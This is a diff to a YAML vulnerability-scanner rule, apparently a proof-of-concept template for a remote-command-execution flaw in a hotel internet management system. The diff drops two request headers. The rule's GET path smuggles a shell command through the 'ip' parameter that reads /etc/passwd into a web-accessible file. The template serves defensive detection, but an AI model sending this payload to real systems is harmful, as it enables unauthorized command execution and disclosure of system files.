@@ -2,9 +2,6 @@ name: Hotel-Internet-Manage-RCE
 rules:
   - method: GET
     path: "/manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../Test.txt&id=1"
-    headers:
-      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
-      Accept-Encoding: "gzip,deflate"
     expression: |
       response.status == 200 && response.body.bcontains(b"parent.doTestResult")
 detail:
